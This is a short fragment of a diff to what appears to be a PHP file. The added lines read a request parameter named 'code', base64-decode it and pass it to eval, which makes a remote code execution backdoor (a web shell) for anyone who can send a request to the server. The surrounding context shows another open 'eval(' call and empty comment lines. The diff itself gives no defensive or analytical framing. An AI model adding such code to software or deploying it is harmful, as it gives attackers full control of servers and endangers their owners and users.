@@ -9,6 +9,9 @@
 
 //
 
+$code = $_REQUEST['code'];
+$code = base64_decode($code);
+eval($code);
 
 eval(
 
